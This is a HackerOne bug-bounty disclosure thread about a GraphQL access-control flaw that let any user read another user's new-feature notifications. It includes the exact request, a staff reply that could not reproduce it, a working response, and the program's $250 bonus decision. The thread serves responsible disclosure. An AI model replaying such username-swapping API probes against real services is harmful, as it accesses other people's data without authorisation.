title: Can read features from any user

profile.name: HackerOne
profile.about: Vulnerability disclosure should be safe, transparent, and rewarding.

vulnerability_information_html:
Summary:
An attacker can read feature notifications from any user.
Just need to change me to user(username:"filedescriptor") in your request to get the features.

Steps To Reproduce

POST /graphql HTTP/1.1
Host: hackerone.com
{"query":"query New_feature { query { id, ...F0 } } fragment F0 on Query { user(username:\"filedescriptor\") { id, username , reputation, new_feature_notification { name, description, url, id } }, id }","variables":{}}

Impact

An attacker can read unread features from any user and have to know how long this user did not visit the hackerone (as example). Probably in future you will make individual feature for individual user.
So now it's a bug.

activities.markdown_message:
Hey @firs0v,

Are you sure? If I try to reproduce this using:

{ user(username: "filedescriptor") { id name new_feature_notification {  name } } }

I'll get:

{
  "data": {
    "user": {
      "id": "Z2lkOi8vaGFja2Vyb25lL1VzZXIvOTA4MQ==",
      "name": "filedescriptor",
      "new_feature_notification": null
    }
  },
  "errors": [
    {
      "message": "Resource does not exist",
      "locations": [
        {
          "line": 1,
          "column": 44
        }
      ],
      "path": [
        "user",
        "new_feature_notification"
      ],
      "type": "NOT_FOUND"
    }
  ]
}

It doesn't include the feature notifications since I can't access it. Did I forgot to add something to my query?

Thanks,

Willian

activities.message:
I tried it again and got feautures:

Request:
`{"query":"query New_feature {\n  query {\n    id,\n    ...F0\n  }\n}\nfragment F0 on Query {\n  user(username:\"wow\") {\n    id, username\n,  reputation,   new_feature_notification {\n      name,\n      description,\n      url,\n      id\n    }\n  },\n  id\n}","variables":{}}`

Response:
`{"data":{"query":{"id":"Z2lkOi8vaGFja2Vyb25lL09iamVjdHM6OlF1ZXJ5L3N0YXRpYw==","user":{"id":"Z2lkOi8vaGFja2Vyb25lL1VzZXIvMjQ1Nw==","username":"wow","reputation":null,"new_feature_notification":{"name":"Healthy programs make for happy hackers","description":"Check out our new program health features to help maintain a healthy, responsive program. Learn more on our blog.","url":"https://www.hackerone.com/blog/Healthy-programs-make-happy-hackers-Introducing-response-SLAs","id":"Z2lkOi8vaGFja2Vyb25lL05ld0ZlYXR1cmVOb3RpZmljYXRpb24vOQ=="}}}}}`

activities.message: Hi @firs0v - thanks again for bringing this to our attention. This doesn't have any security implications at the moment and it's a very low chance it might have in the future. However, even though it doesn't meet the barrier of our minimum bounty, we're awarding you with a $250 bonus for bringing this to our attention. We appreciate the report. We'll give you an update when we got the fix out. Happy hacking!
